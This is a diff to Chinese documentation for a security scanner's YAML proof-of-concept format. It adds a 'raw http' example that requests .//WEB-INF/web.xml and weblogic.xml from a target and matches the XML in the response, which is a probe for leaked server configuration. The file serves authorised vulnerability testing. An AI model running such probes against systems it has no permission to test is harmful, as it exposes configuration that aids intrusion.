@@ -90,6 +90,28 @@ expression: 最外面的 `expression` 是 `rules` 的验证表达式，`r0() || 
 
 > 如果 rules 表达式都是 `||`关系，比如：r0() || r1() || r2() ... ，默认执行 `stop_if_match` 动作。同理，如果表达式都是 `&&` 关系，默认执行 `stop_if_mismatch` 动作。
 
+### raw http
+```yaml
+set:
+  hostname: request.url.host
+rules:
+  r0:
+    request:
+      raw: |
+        GET .//WEB-INF/web.xml HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') && (response.raw_header.bcontains(b'application/xml') || response.raw_header.bcontains(b'text/xml'))
+  r1:
+    request:
+      raw: |
+        GET .//WEB-INF/weblogic.xml HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    expression: response.status == 200 && response.body.bcontains(b'<weblogic-web-app') && response.body.bcontains(b'</weblogic-web-app>') && (response.raw_header.bcontains(b'application/xml') || response.raw_header.bcontains(b'text/xml'))
+expression: r0() || r1()
+```
+raw: 顾名思义，支持原生 http 请求
 # 免责声明
 
 本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。
